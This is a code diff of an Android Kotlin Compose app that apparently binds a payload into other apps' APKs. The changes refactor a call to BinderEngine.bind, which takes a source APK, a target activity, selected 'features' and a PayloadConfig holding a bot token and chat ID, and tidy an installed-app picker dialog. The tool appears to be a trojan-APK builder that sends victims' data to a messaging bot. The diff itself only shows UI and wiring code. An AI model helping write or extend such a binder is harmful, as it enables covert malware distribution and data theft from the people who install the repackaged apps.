@@ -131,19 +131,15 @@ fun HomeScreen() {
             try {
                 val dirDoc = DocumentFile.fromTreeUri(ctx, dir)
                     ?: throw IllegalStateException("Invalid output folder")
-                
-                // আপনার BinderEngine.kt-এর রিটার্ন টাইপ ও প্যারামিটার অনুযায়ী এটি ঠিক করা হয়েছে
                 BinderEngine(ctx).bind(
                     source = uri,
                     activity = activityInput.trim(),
                     label = apkLabel,
                     features = selected.toSet(),
                     config = PayloadConfig(token, chatId, selected.map { it.key }, null),
-                    outDir = dirDoc
-                ) { level, message -> 
-                    log(level, message) 
-                }
-                
+                    outDir = dirDoc,
+                    onLog = { level, message -> log(level, message) }
+                )
             } catch (t: Throwable) {
                 log(LogLevel.ERROR, t.message ?: "Binding failed")
             } finally {
@@ -296,9 +292,8 @@ private fun AppPickerDialog(onDismiss: () -> Unit, onPick: (ApplicationInfo) -> 
         }
     }
 
-    // টাইপ এক্সপ্লিসিটলি বলে দেওয়া হয়েছে যাতে কম্পাইলার কনফিউজ না করে
-    val filtered: List<ApplicationInfo> = apps.filter { appInfo ->
-        query.isBlank() || appInfo.loadLabel(ctx.packageManager).toString().contains(query, true)
+    val filtered = apps.filter {
+        query.isBlank() || it.loadLabel(ctx.packageManager).toString().contains(query, true)
     }
 
     AlertDialog(
@@ -329,7 +324,7 @@ private fun AppPickerDialog(onDismiss: () -> Unit, onPick: (ApplicationInfo) -> 
                         Modifier.heightIn(max = 380.dp),
                         verticalArrangement = Arrangement.spacedBy(4.dp)
                     ) {
-                        items(filtered) { info: ApplicationInfo ->
+                        items(filtered) { info ->
                             Row(
                                 Modifier
                                     .fillMaxWidth()
@@ -365,3 +360,7 @@ private fun AppPickerDialog(onDismiss: () -> Unit, onPick: (ApplicationInfo) -> 
         confirmButton = { TextButton(onClick = onDismiss) { Text("Close", color = TextMuted) } }
     )
 }
+
+
+
+
